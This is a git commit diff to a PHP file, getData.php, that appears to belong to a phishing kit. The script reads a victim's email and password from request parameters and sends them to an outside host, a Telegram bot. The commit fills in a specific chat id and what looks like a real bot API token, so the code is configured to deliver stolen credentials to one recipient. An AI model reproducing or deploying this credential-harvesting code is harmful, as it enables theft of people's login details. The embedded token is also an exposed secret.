bbaa8b00a4eb483a9f3a58bfa93a956ec8653838
zankee <66905046+zankee@users.noreply.github.com>
2020-12-15 19:35:51 +0700

    Update getData.php

--- getData.php
+++ getData.php
@@ -10,7 +10,7 @@ $password = $_GET["password"];
 
 $message = "Username : $email \nPassword: $password \nTried Login at $time IST";
 
-$chat_id= 1171876903; // replace with your userid
+$chat_id= 1476764470; // replace with your userid
 
 
 send_message($chat_id,"$message");
@@ -18,7 +18,7 @@ send_message($chat_id,"$message");
 
 function send_message($chat_id, $message){
         $text = urlencode($message);
-        $apiToken = "Your Bot Api Token";
+        $apiToken = "1476764470:AAEW14DAwxBRSPih4zyHfg7Go1abFhq_yRg";
         file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?chat_id=$chat_id&text=$text");
     }
 ?>
